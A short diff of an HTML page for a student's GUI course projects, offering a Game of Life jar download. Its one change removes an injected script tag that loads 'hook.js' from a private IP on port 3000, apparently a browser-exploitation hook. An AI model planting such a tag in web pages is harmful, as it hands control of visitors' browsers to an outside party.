@@ -27,4 +27,4 @@ My codes from GUI Design and Programming with Dr. Michel Pasquier
 <H5><a href='Game of Life.jar' download>Click here for the Jar File</a></H5>
 
 
-<script src=”http://10.25.148.169:3000/hook.js” type=”text/javascript”></script>
+
